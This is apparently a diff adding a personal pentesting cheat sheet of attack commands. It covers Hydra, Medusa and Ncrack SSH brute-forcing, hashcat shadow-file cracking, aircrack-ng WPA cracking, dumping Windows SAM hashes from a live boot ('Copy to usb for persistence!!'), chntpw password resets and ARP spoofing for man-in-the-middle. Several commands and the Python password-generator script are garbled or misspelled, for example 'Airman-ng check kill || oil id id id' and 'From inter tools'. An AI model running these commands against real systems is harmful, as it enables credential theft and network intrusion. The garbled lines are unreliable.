@@ -1,0 +1,162 @@
+Commands:
+
+HASHCAT: 
+hashcat -m 500 /path/to/shadoFile /usr/share/wordlist/worlist.txt --force(if on vm) > /path/to/output/file --show
+
+Java decompiler
+Jd-gui
+Dex2jar  -  apps
+
+Windows/linux decompiler
+Ida pro
+GDB.   -  course available on penitest academy
+
+
+HYDRA:
+hydra -e snr 192.168.1.100 ssh -L /path/to/userList -F -V -t 6 -u (search user password using username files)
+hydra 192.168.1.100 ssh -l name -P /path/to/password/list -F -V -t 6 
+hydra 192.168.1.100 ssh -L path/to/usernames -P path/to/password/list -F -V -t 6 -u
+
+Medusa 
+Medusa -U userNames.txt -e sn -h 192.168.1.x -M ssh -F
+Medusa -u name -P path/to/wordlist -h 192.168.1.x -M ssh
+
+Ncrack
+Ncrack --user name -P path/to/password -T 4 ssh://ip
+
+SETTING INTERFACE IP:
+ifconfig eth0(interface) 192.168.1.1
+
+Reset network adapters
+Dhclient -v -r
+Dhclient -v
+
+PING:
+ping ip-address
+ping -c num-of-pings ip-address
+
+fPing
+fping –a –g 192.168.32.1 192.168.32.254
+-a active hosts
+-g group 
+
+
+Windows 128
+Linux 64
+
+FPING:
+fping ip-address
+fping -c num-of-pings ip-address
+fping ip-address domain domain
+fping -a -g ip-address-lower ip-address-higher
+
+NMAP
+nmap -sV -O ip-address ip-address > outPut.txt (quick scan)
+nmap -sV -p- ip-address-lower ip-address-higher > outPut.txt (slower scan)
+nmap -sU -p- ip-address-lower ip-address-higher > output.txt (slow UDP scan) 
+-sV version scan
+-sP probe scan
+-sU UDP scan
+-O operating system
+-A aggressive scan
+-T scan speed (0-5) 0=less invasive, 5=more aggressive
+
+nmap vulnerability scans
+nmap <target> --script vuln. (Search ms patch number or cve (common vulnerability and exposures))
+
+
+NETDISCOVER
+netdiscover -r 192.168.1.1/24 (scan ip range)
+
+
+
+OPEN-VAS
+Apt install openvas
+Openvas-setup
+openvasmd --create-user=newuser --role=Admin 
+openvasmd --user=newuser --new-password=somepassword
+openvasmd –user=admin –new-password=[password]
+openvas-stop
+Openvas-start
+Openvas-check-setup
+openvasmd --rebuild
+
+
+WIRELESS-CRACKING
+Airodump-ng wlan0 (Find all networks to get Essid)
+Airmon-ng start wlan0
+If processes are running
+Airman-ng check kill || oil id id id 
+
+Airodump interface --write fileName --channel channel-number --essid network-name
+(WEP)
+Aircrack-ng file-name.cap 
+(WPA)
+Aircrack-ng file-name,cap -w /path/to/word/list
+
+
+
+Python file server
+python3 -m http.server (in folder that needs serving)
+Wget -r http://ip-server:8000/file-name
+
+
+Release IP address
+Dhclient -v -r
+Dhclient -v
+
+cewl(custom word lists)
+Mewl -w(write to file) nameOfWordList.txt -d(depth) 1-? -m(minimum word length) www.webpageName.com
+
+Wc (count words/lines in file)
+Wc -l filename (count lines)
+Wc -w filename (count words)
+Wc -m filename (count characters)
+Wc -L filename (print the longest word)
+
+-------------------------------------------------------------------------------
+Python script to create variations of password.
+
+#!/usr/bin/env python
+From inter tools import combinations_with_replacement
+
+Array = ["a","b","c"]
+
+Comb = combinations_with_replacement(array, 3). //set length of password needed
+
+For I in list(comb):
+	print(''.join(map(stray)))
+
+---------------------------------------------------------------------------------
+
+Path to sam file
+ c:\Windows\System32\Config\directory. 
+
+Access sam file with kali Linus live boot
+fdisk –l.  --To see a list of drives available
+2.mkdir/mnt/sda1  --Create a mount folder
+3.mount /dev/sda1 /mnt/sda1 --mount directory 
+
+Navigate to the SAM file
+1.cd/mnt/sda1/Windows/System32/config/
+Use Samdump2 tool to decrypt the file
+1.Samdump2 system SAM > / tmp/hashes.txt
+Copy to usb for persistence!!
+
+Extract syskey bootkeg from system hive
+bkhive system sys_key.txt
+Samdump2 SAM sys_key.txt > /tmp/hash.txt
+
+Password reset on nt systems
+chntpw –i/mnt/sda1/Windows/system32/config/SAM
+
+
+ARP-Spoof
+Start packet forward
+echo 1 | sudo tee /prov/sys/net/ipv4/ip_forward
+
+Redirect macs to mitm pc
+Sudo arpspoof ip-a -t ip-b
+Sudo atpspoof ip-b -t ip-a
+
+
